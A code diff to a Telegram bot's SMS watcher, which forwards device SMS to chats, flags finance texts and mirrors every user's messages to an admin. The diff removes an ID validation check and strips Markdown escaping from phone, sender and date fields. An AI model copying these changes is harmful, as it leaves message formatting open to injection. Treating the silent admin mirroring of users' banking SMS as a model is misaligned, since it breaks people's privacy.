@@ -49,10 +49,6 @@ let botRef: Telegraf | null = null;
 const chatQueues = new Map<string, string[]>();
 const chatDraining = new Set<string>();
 
-function isValidTelegramId(id: string): boolean {
-  return /^\d{5,20}$/.test(id);
-}
-
 function enqueue(chatId: string, text: string): void {
   const q = chatQueues.get(chatId) ?? [];
   q.push(text);
@@ -78,7 +74,7 @@ async function drainChat(chatId: string): Promise<void> {
       for (let attempt = 0; attempt < 10; attempt++) {
         try {
           await botRef.telegram.sendMessage(chatId, text, {
-            parse_mode: "MarkdownV2",
+            parse_mode: "Markdown",
           });
           sent = true;
           break;
@@ -178,6 +174,7 @@ function isFinanceSms(text: string): boolean {
   }
   return hasAmount;
 }
+
 
 /** Small delay to avoid Telegram rate limits */
 const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));
@@ -312,13 +309,13 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           const msg =
             `📨 *New SMS*\n\n` +
             `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
-            `🕐 ${escapeMarkdown(dateStr)}\n\n` +
+            `🕐 ${dateStr}\n\n` +
             `${escapeMarkdown(body)}`;
 
           const financeMsg =
             `💰 *Finance Alert*\n\n` +
             `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
-            `🕐 ${escapeMarkdown(dateStr)}\n\n` +
+            `🕐 ${dateStr}\n\n` +
             `${escapeMarkdown(body)}`;
 
           // ── 1. Global admin channel ──────────────────────────────────
@@ -328,8 +325,8 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
           // ── 1b. Always mirror to admin DM (all users / connections) ──
           const adminMsg =
-            `📨 *New SMS*  ${escapeMarkdown("(" + (ownerTelegramId && isValidTelegramId(ownerTelegramId) && ownerTelegramId !== adminId.toString() ? "user " + ownerTelegramId : "device " + deviceId) + ")")}\n\n` +
-            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n\n` +
+            `📨 *New SMS*  (${ownerTelegramId && ownerTelegramId !== adminId.toString() ? "user " + ownerTelegramId : "device " + deviceId})\n\n` +
+            `📱 \`${phone}\`  ›  *${from}*\n\n` +
             `${escapeMarkdown(body.slice(0, 160))}${body.length > 160 ? "…" : ""}`;
           enqueue(adminId.toString(), adminMsg);
 
@@ -361,7 +358,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           }
 
           // ── 2. Owner notifications ───────────────────────────────────
-          if (ownerTelegramId && isValidTelegramId(ownerTelegramId)) {
+          if (ownerTelegramId) {
             const ownerCfg = userChannels?.[ownerTelegramId] || {};
 
             // 2a. Owner's personal SMS channel (if configured)
@@ -395,7 +392,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
                   const kwMsg =
                     `🔔 *Keyword Alert: ${escapeMarkdown(rule.keyword)}*\n\n` +
                     `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
-                    `🕐 ${escapeMarkdown(dateStr)}\n\n` +
+                    `🕐 ${dateStr}\n\n` +
                     `${escapeMarkdown(body)}`;
                   enqueue(rule.channel, kwMsg);
                 }
